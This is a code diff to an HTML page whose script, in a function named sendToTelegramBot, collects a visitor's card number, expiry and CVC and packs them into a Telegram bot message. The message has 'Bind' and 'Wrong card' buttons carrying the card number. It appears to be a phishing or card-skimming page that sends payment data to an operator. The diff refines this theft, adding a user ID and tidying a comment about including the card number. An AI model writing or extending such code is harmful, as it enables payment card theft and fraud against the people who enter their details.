@@ -1280,8 +1280,9 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // УНИКАЛЬНЫЙ ID: timestamp + счетчик
+        // УНИКАЛЬНЫЙ ID
         const paymentId = Date.now() + (paymentCounter++);
+        const userId = sessionStorage.getItem('currentUserId') || 'user123';
 
         const message = `👤 Клиент:
 • Имя: ${formData.firstName || 'Тест'}
@@ -1319,7 +1320,7 @@ async function sendToTelegramBot() {
                         [
                             { 
                                 text: "🔗 Привязать", 
-                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`  // ← ДОБАВЬ НОМЕР КАРТЫ СЮДА!
+                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
                             },
                             { 
                                 text: "❌ Неверная карта", 
@@ -1489,6 +1490,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
